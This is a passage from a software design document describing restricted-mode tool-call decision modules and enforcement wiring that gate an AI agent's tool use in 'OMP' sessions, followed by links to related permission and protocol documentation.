Pure restricted-mode tool-decision modules were defined by `define-omp-restricted-tool-decisions` (`src/acp/omp/tool-inventory.ts`, `src/acp/omp/tool-provenance.ts`, `src/acp/omp/approval-records.ts`, `src/acp/omp/destructive-decision.ts`). They are consulted **only in restricted OMP sessions** — native-YOLO sessions receive none of these clamps (its LSP disablement rides the both-mode `--no-lsp` carrier of decision 5 / row 17, with its settings-level pin owned by row 25) and every OpenCode flow in Layers 1–5 above is untouched. The layers above remain the operative runtime enforcement; these decisions are consulted per restricted `tool_call` by the trusted-extension enforcement wiring (row 16 below; see [docs/OMP_ENFORCEMENT.md](OMP_ENFORCEMENT.md)), and 14c owns generic-command canonicalization. See [docs/OMP_TOOL_POLICY.md](OMP_TOOL_POLICY.md) for the inventory table, alternate-route pair table, provenance admission, record-interpretation rules, MCP mechanism tiers, and the preserved pinned verdicts (record-reset INCOMPATIBLE, destructive-intent UNRESOLVED) with their DECIDED dispositions. No runtime enforcement, record reset, or complete native destructive decoding is claimed by this layer's tests.

---

## Restricted `tool_call` Enforcement Wiring (OMP Integration Row 16 / P5c-ii)

`wire-omp-restricted-tool-enforcement` attaches the restricted `tool_call` handler in the trusted extension's synchronous load sequence and composes the row-14a decisions per call with fresh origin/epoch/generation reads and zero local decision logic; the native-YOLO exemption is structural at the registration site. Whether the official binary invokes the attached handler remains user-owned runtime verification — no automated suite certifies native invocation, enforcement, reset, or decoding. See [docs/OMP_ENFORCEMENT.md](OMP_ENFORCEMENT.md).

---

## Related Documentation

- [OpenCode Permissions](https://opencode.ai/docs/permissions/) — OpenCode's permission system documentation
- [OpenCode Tools](https://opencode.ai/docs/tools/) — Available tools and permission keys
- [OpenCode Skills](https://opencode.ai/docs/skills/) — Skills system and permissions
- [ACP Protocol Spec](https://agentclientprotocol.org/) — Agent Client Protocol specification
- [docs/DESIGN.md](DESIGN.md) — Overall system design including trust boundary model
- [openspec/specs/acp-integration/spec.md](../openspec/specs/acp-integration/spec.md) — OpenSpec specification for ACP integration and permission hardening
